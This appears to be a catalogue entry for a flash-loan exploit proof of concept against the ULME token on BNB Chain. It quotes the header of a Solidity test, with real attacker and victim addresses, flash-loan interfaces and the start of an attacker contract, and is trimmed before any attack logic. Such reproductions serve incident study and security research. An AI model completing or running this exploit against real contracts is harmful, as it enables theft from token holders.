# [?] ULME_exp2 exploit (2022-10)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ULME_exp2
Published: 2022-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ULME_exp2.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~250k US$ which resulted in ~50k profit
// Attacker : 0x056c20ab7e25e4dd7e49568f964d98e415da63d3
// Attack Contract : 0x8523c7661850d0da4d86587ce9674da23369ff26
// Vulnerable Contract : 0xAE975a25646E6eB859615d0A147B909c13D31FEd (ULME Token)
// Attack Tx : https://phalcon.blocksec.com/tx/bsc/0xdb9a13bc970b97824e082782e838bdff0b76b30d268f1d66aac507f1d43ff4ed

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1584839309781135361
// Beosin: https://twitter.com/BeosinAlert/status/1584888021299916801
// Neptune Mutual: https://medium.com/neptune-mutual/decoding-ulme-token-flash-loan-attack-56470d261787

interface IULME is IERC20 {
    function buyMiner(address user, uint256 usdt) external returns (bool);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDPP {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ULMEAttacker is Test {
    CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ULME_exp2.sol_
